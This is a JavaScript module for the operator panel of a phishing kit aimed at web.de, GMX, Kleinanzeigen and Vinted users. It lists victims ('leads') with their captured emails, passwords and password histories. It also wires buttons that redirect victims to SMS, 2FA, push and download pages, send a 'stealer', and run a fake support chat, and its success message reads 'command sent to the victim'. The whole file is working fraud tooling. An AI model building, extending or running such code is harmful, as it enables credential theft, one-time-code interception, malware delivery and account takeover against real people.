// modules/backend.js — подключает прототип к реальному бэкенду.
// Шаги: 1) /api/leads → список, 2) WS realtime, 3) клик по лиду → детали,
// 4) action-кнопки → реальные POST на /api/redirect-*, /api/show-*, /api/send-*.

const LIST_EL = document.querySelector('.lead-list');
const COUNT_EL = document.querySelector('.list-count');
const PAGINATOR_INFO = document.querySelectorAll('.paginator span');

// Кэш лидов и id текущего открытого
let leadsCache = [];
let activeLeadId = null;

// Текущая активная группа из mode-pill: webde | klein | vint | hidden
function activeBrandGroup() {
  const a = document.querySelector('#mode-pill button.active');
  return a ? (a.getAttribute('data-brand') || 'webde') : 'webde';
}

// Принадлежит ли лид текущей группе. E-Mail (webde) = брэнды webde+gmx,
// Klein = klein, Vint = vint, Скрытые = архивные.
function leadInGroup(lead, group) {
  const isArchived = lead.adminLogArchived === true || lead.klLogArchived === true;
  if (group === 'hidden') return isArchived;
  if (isArchived) return false; // в обычных группах архивные не показываем
  const b = (lead.brand || '').toLowerCase();
  if (group === 'klein') return b === 'klein';
  if (group === 'vint')  return b === 'vint';
  // E-Mail (webde) — почтовые: webde + gmx (или без brand если есть email/password)
  return b === 'webde' || b === 'gmx' || (!b && (lead.email || lead.password));
}

function renderForActiveBrand() {
  const g = activeBrandGroup();
  const filtered = leadsCache.filter((l) => leadInGroup(l, g));
  renderLeads(filtered);
  // оставляем active, если совпадает с текущей группой; иначе сбрасываем
  if (activeLeadId && !filtered.find((l) => String(l.id) === String(activeLeadId))) {
    activeLeadId = filtered[0] ? filtered[0].id : null;
  }
  if (activeLeadId) {
    LIST_EL.querySelectorAll('.lead-row').forEach((x) => x.classList.toggle('active', x.getAttribute('data-lead-id') === activeLeadId));
    const lead = filtered.find((l) => String(l.id) === String(activeLeadId));
    if (lead) renderDetail(lead);
  }
}

if (LIST_EL) {
  bootstrap();
  wireDetailHandlers();
  wireActionHandlers();
  // Клик по mode-pill → переключаем группу и перерисовываем
  document.querySelectorAll('#mode-pill button').forEach((b) => {
    b.addEventListener('click', () => {
      // active-классом уже занимается brand.js — мы только переотрисовываем
      renderForActiveBrand();
    });
  });
}

async function bootstrap() {
  try {
    const leads = await fetchLeads();
    leadsCache = leads;
    renderForActiveBrand();
    renderStats();
  } catch (e) {
    console.error('[backend] fetch failed', e);
    if (window.toast) window.toast.error('Не удалось загрузить лидов', e.message || '');
    return;
  }
  connectWS();
}

async function fetchLeads() {
  const r = await fetch('/api/leads', { credentials: 'include' });
  if (!r.ok) throw new Error('HTTP ' + r.status);
  const d = await r.json();
  return Array.isArray(d) ? d : (d.leads || []);
}

function brandClass(brand) {
  if (brand === 'gmx') return 'gx';
  if (brand === 'klein') return 'kl';
  if (brand === 'vint') return 'vt';
  return 'wd';
}

function statusBadge(lead) {
  const st = (lead.status || '').toLowerCase();
  // soft maps from server status → prototype badge
  if (st.includes('success') || st === 'show_success') return { cls: 'success', label: 'Успех' };
  if (st.includes('wrong') || st === 'error') return { cls: 'danger', label: 'Ошибка' };
  if (st.includes('sms')) return { cls: 'warning', label: 'SMS wait' };
  if (st.includes('push')) return { cls: 'info', label: 'PUSH' };
  if (st.includes('2fa') || st.includes('two_factor')) return { cls: 'warning', label: '2FA' };
  if (st.includes('change_password')) return { cls: 'warning', label: 'Password' };
  if (st.includes('download')) return { cls: 'info', label: 'Download' };
  if (st.includes('email') || st === 'pending') return { cls: '', label: 'Новый' };
  return { cls: '', label: st || '—' };
}

function isOnline(lead) {
  if (!lead.lastSeenAt) return false;
  const dt = new Date(lead.lastSeenAt).getTime();
  return Date.now() - dt < 60_000; // считаем онлайн если активность за минуту
}

function leadRowHtml(lead, idx) {
  const email = lead.email || lead.emailKl || lead.emailVt || '—';
  const badge = statusBadge(lead);
  const online = isOnline(lead);
  return `
    <div class="lead-row" data-lead-id="${escapeAttr(lead.id || '')}">
      <span class="lead-num">${idx + 1}</span>
      <span class="lead-status-dot ${online ? '' : 'offline'}"></span>
      <div class="lead-info">
        <div class="lead-email">${escapeHtml(email)}</div>
        <div class="lead-meta">
          <span class="badge ${badge.cls}">${escapeHtml(badge.label)}</span>
        </div>
      </div>
    </div>
  `;
}

function renderLeads(leads) {
  if (!LIST_EL) return;
  LIST_EL.innerHTML = leads.map(leadRowHtml).join('') || '<div class="list-empty" style="padding:24px;color:var(--text-3);text-align:center">Лидов нет</div>';
  // первый — активный по умолчанию
  const first = LIST_EL.querySelector('.lead-row');
  if (first) first.classList.add('active');
  if (COUNT_EL) COUNT_EL.textContent = leads.length ? `1-${leads.length}/${leads.length}` : '0/0';
  PAGINATOR_INFO.forEach((s) => { if (/\d+\/\d+/.test(s.textContent)) s.textContent = '1/1'; });
}

// ── Lead detail (правая колонка) ──────────────────────────────────────
const DETAIL_EMAIL    = document.querySelector('.detail-h1');
const DETAIL_STATUS   = document.querySelector('.detail-h1 .badge');
const FIELD_EMAIL     = findFieldValue('Email');
const FIELD_EMAIL_VT  = findFieldValue('Email VT');
const FIELD_PASSWORD  = findFieldValue('Password');
const FIELD_PASSWORD_VT = findFieldValue('Password VT');
const FIELD_PWHIST    = findFieldValue('Password history');
const EVENTS_CONTAINER = document.querySelector('#lead-events');

function findFieldValue(labelText) {
  // ищем .field-card где .field-label содержит labelText
  const cards = document.querySelectorAll('.field-card');
  for (const c of cards) {
    const lbl = c.querySelector('.field-label');
    if (lbl && lbl.textContent.trim().toLowerCase() === labelText.toLowerCase()) {
      return c.querySelector('.field-value');
    }
  }
  return null;
}

function wireDetailHandlers() {
  if (!LIST_EL) return;
  LIST_EL.addEventListener('click', (e) => {
    const r = e.target.closest && e.target.closest('.lead-row');
    if (!r) return;
    if (document.body.classList.contains('is-selecting')) return;
    const id = r.getAttribute('data-lead-id');
    if (id) selectLead(id);
  });
}

function selectLead(id) {
  const lead = leadsCache.find((l) => String(l.id) === String(id));
  if (!lead) return;
  activeLeadId = id;
  // визуально подсвечиваем
  LIST_EL.querySelectorAll('.lead-row').forEach((x) => x.classList.toggle('active', x.getAttribute('data-lead-id') === id));
  renderDetail(lead);
  // подгружаем чат для нового лида (если включён tab Chat)
  if (typeof loadChatForActive === 'function') loadChatForActive();
}

function renderDetail(lead) {
  // Заголовок: email + статус
  const email = lead.email || lead.emailKl || lead.emailVt || '—';
  if (DETAIL_EMAIL) {
    // ищем span внутри h1 и обновляем текстовый узел
    const node = Array.from(DETAIL_EMAIL.childNodes).find((n) => n.nodeType === Node.TEXT_NODE);
    if (node) node.textContent = email + ' ';
    else DETAIL_EMAIL.prepend(document.createTextNode(email + ' '));
  }
  if (DETAIL_STATUS) {
    const online = isOnline(lead);
    DETAIL_STATUS.className = 'badge ' + (online ? 'success' : 'danger');
    DETAIL_STATUS.innerHTML = '<span class="badge-dot"></span>' + (online ? 'Online' : 'Offline');
  }
  setFieldText(FIELD_EMAIL, lead.email);
  setFieldText(FIELD_EMAIL_VT, lead.emailVt || lead.emailKl);
  setFieldText(FIELD_PASSWORD, lead.password);
  setFieldText(FIELD_PASSWORD_VT, lead.passwordVt || lead.passwordKl);
  // история паролей (массив)
  const hist = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : (lead.passwordHistoryJson ? safeParse(lead.passwordHistoryJson) : []);
  setFieldText(FIELD_PWHIST, hist && hist.length ? hist.map((h) => (typeof h === 'string' ? h : (h.p || h.password || h))).join(', ') : '');

  // Events таймлайн
  renderEvents(lead);
}

function setFieldText(el, val) {
  if (!el) return;
  const v = val == null || val === '' ? '' : String(val);
  el.textContent = v || '—';
  el.classList.toggle('empty', !v);
}

function renderEvents(lead) {
  if (!EVENTS_CONTAINER) return;
  // оставляем events-head, чистим строки событий
  EVENTS_CONTAINER.querySelectorAll('.event-row').forEach((n) => n.remove());
  const ev = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : (lead.eventTerminalJson ? safeParse(lead.eventTerminalJson) : []);
  const last = ev.slice(-5).reverse();
  last.forEach((e, idx) => {
    const row = document.createElement('div');
    row.className = 'event-row' + (idx === 0 ? ' highlight' : '');
    const t = e.at ? new Date(e.at).toTimeString().slice(0, 5) : '';
    const label = escapeHtml(e.label || '');
    row.innerHTML = `<span class="event-time">${t}</span><div class="event-text"><span class="event-arrow">→</span>${label}</div>`;
    EVENTS_CONTAINER.appendChild(row);
  });
}

function safeParse(j) { try { return JSON.parse(j); } catch (_) { return []; } }

// ── Action buttons (Error / Push / SMS / 2-FA / E-Mail / Success / Скрыть / ...) ──
const ACTION_ENDPOINTS = {
  'Error':     '/api/show-error',
  'Push':      '/api/redirect-push',
  'SMS':       '/api/redirect-sms-code',
  '2-FA':      '/api/redirect-2fa-code',
  'Wait':      '/api/redirect-klein-sms-wait',
  'Password':  '/api/redirect-change-password',
  'PC Page':   '/api/redirect-open-on-pc',
  'Download':  '/api/redirect-download-by-platform',
  'E-Mail':    '/api/send-email',
  'Stealer':   '/api/send-stealer',
  'Kl':        '/api/redirect-klein-forgot',
  'Успех':     '/api/show-success',
  'Скрыть':    '/api/mark-worked',
};

function wireActionHandlers() {
  document.querySelectorAll('.action-grid .act-btn').forEach((btn) => {
    btn.addEventListener('click', async (e) => {
      const label = (btn.textContent || '').trim();
      const url = ACTION_ENDPOINTS[label];
      if (!url || !activeLeadId) return;
      // Останавливаем generic-handler из actions.js, чтобы тост был только один
      e.stopImmediatePropagation && e.stopImmediatePropagation();
      try {
        const r = await fetch(url, {
          method: 'POST',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: activeLeadId }),
        });
        if (!r.ok) throw new Error('HTTP ' + r.status);
        if (window.toast) window.toast.success(label, 'Команда отправлена жертве');
        if (!btn.classList.contains('muted')) {
          document.querySelectorAll('.act-btn.active').forEach((x) => { if (x !== btn && !x.classList.contains('muted')) x.classList.remove('active'); });
          btn.classList.add('active');
        }
      } catch (err) {
        if (window.toast) window.toast.error('Ошибка ' + label, err.message || '');
      }
    });
  });
}

// ── Stats: пересчёт по реальным leadsCache + /api/stats ───────────────
function renderStats() {
  if (!leadsCache.length) return;
  const brands = { webde: [], gmx: [], klein: [], vint: [] };
  leadsCache.forEach((l) => {
    const b = (l.brand || '').toLowerCase();
    if (brands[b]) brands[b].push(l);
    else if (l.email || l.password) brands.webde.push(l);
  });
  const isSuccess = (l) => /success|show_success/i.test(l.status || '');
  const isClicked = (l) => l.openedAt || l.lastSeenAt; // переход = было открытие сайта
  document.querySelectorAll('.brand-stats').forEach((card) => {
    const dot = card.querySelector('.brand-dot');
    let key = 'webde';
    if (dot && dot.classList.contains('gx')) key = 'gmx';
    else if (dot && dot.classList.contains('kl')) key = 'klein';
    else if (dot && dot.classList.contains('vt')) key = 'vint';
    const list = brands[key] || [];
    const total = list.length;
    const clicks = list.filter(isClicked).length;
    const success = list.filter(isSuccess).length;
    const vals = card.querySelectorAll('.brand-stat-value');
    if (vals[0]) vals[0].textContent = total;
    if (vals[1]) {
      const pct = total ? Math.round((clicks / total) * 100 * 10) / 10 : 0;
      vals[1].innerHTML = `${clicks} <span class="brand-stat-pct">${pct}%</span>`;
    }
    if (vals[2]) {
      const pct = clicks ? Math.round((success / clicks) * 100 * 10) / 10 : 0;
      vals[2].innerHTML = `${success} <span class="brand-stat-pct">${pct}%</span>`;
    }
  });
}

// ── Чат с лидом — /api/chat ───────────────────────────────────────────
const CHAT_LOG    = document.getElementById('chat-log');
const CHAT_EMPTY  = document.getElementById('chat-empty');
const CHAT_TYPING = document.getElementById('chat-typing');
const CHAT_FORM   = document.getElementById('chat-compose');
const CHAT_INPUT  = document.getElementById('chat-input');

let chatPollTimer = null;
let chatLastAt = 0;

async function fetchChat(leadId) {
  const r = await fetch(`/api/chat?leadId=${encodeURIComponent(leadId)}`, { credentials: 'include' });
  if (!r.ok) throw new Error('HTTP ' + r.status);
  return r.json();
}

function chatTimeFmt(at) {
  try { return new Date(at).toTimeString().slice(0, 5); } catch (_) { return ''; }
}

function renderChat(messages) {
  if (!CHAT_LOG) return;
  CHAT_LOG.querySelectorAll('.chat-msg').forEach((n) => n.remove());
  if (!messages || !messages.length) {
    if (CHAT_EMPTY) CHAT_EMPTY.hidden = false;
    return;
  }
  if (CHAT_EMPTY) CHAT_EMPTY.hidden = true;
  messages.forEach((m) => {
    const side = m.from === 'support' ? 'out' : 'in';
    const wrap = document.createElement('div');
    wrap.className = `chat-msg chat-msg--${side}`;
    if (side === 'out' && (m.deliveryStatus === 'read')) wrap.classList.add('read');
    const ticks = side === 'out' ? '<span class="chat-msg-ticks">✓✓</span>' : '';
    const safe = String(m.text || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    wrap.innerHTML = `<div class="chat-msg-body">${safe}</div><div class="chat-msg-time">${chatTimeFmt(m.at)}${ticks}</div>`;
    if (CHAT_TYPING) CHAT_LOG.insertBefore(wrap, CHAT_TYPING);
    else CHAT_LOG.appendChild(wrap);
  });
  CHAT_LOG.scrollTop = CHAT_LOG.scrollHeight;
}

async function loadChatForActive() {
  if (!activeLeadId) { renderChat([]); return; }
  try {
    const data = await fetchChat(activeLeadId);
    renderChat(data.messages || []);
    if (CHAT_TYPING) CHAT_TYPING.hidden = !data.userTyping;
  } catch (e) {
    if (window.toast) window.toast.error('Чат недоступен', e.message || '');
  }
}

function startChatPolling() {
  if (chatPollTimer) return;
  chatPollTimer = setInterval(() => {
    if (!document.getElementById('lead-chat') || document.getElementById('lead-chat').hidden) return;
    loadChatForActive();
  }, 4000);
}

CHAT_FORM && CHAT_FORM.addEventListener('submit', async (e) => {
  e.preventDefault();
  const text = (CHAT_INPUT.value || '').trim();
  if (!text || !activeLeadId) return;
  CHAT_INPUT.value = '';
  try {
    const r = await fetch('/api/chat', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ leadId: activeLeadId, from: 'support', text }),
    });
    if (!r.ok) throw new Error('HTTP ' + r.status);
    loadChatForActive();
  } catch (err) {
    if (window.toast) window.toast.error('Сообщение не отправлено', err.message || '');
  }
});

// Когда юзер переключает rail-кнопку Chat → загрузить актуальное
document.querySelectorAll('.rail-btn[data-rail="chat"]').forEach((b) => {
  b.addEventListener('click', () => loadChatForActive());
});

startChatPolling();

// ── WebSocket ─────────────────────────────────────────────────────────
function connectWS() {
  let url;
  try {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    url = `${proto}//${location.host}/ws`;
  } catch (_) { return; }
  let ws;
  let backoff = 1000;
  function open() {
    try { ws = new WebSocket(url); } catch (e) { setTimeout(open, backoff); return; }
    ws.onopen = () => { backoff = 1000; };
    ws.onmessage = onWSMessage;
    ws.onclose = () => { setTimeout(open, Math.min(backoff *= 2, 15000)); };
    ws.onerror = () => { try { ws.close(); } catch (_) {} };
  }
  open();
}
async function onWSMessage(ev) {
  let msg;
  try { msg = JSON.parse(ev.data); } catch (_) { return; }
  // На любое событие, релевантное лидам — перечитываем список и перерендериваем детали активного.
  if (msg && (msg.type === 'lead' || msg.kind === 'lead' || msg.event === 'lead-updated' || msg.event === 'lead-added')) {
    try {
      const leads = await fetchLeads();
      leadsCache = leads;
      renderForActiveBrand();
      renderStats();
    } catch (_) {}
  }
  // Сообщение в чате → перезагружаем чат активного лида
  if (msg && (msg.type === 'chat' || msg.event === 'chat-message')) {
    if (typeof loadChatForActive === 'function') loadChatForActive();
  }
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
function escapeAttr(s) { return escapeHtml(s); }
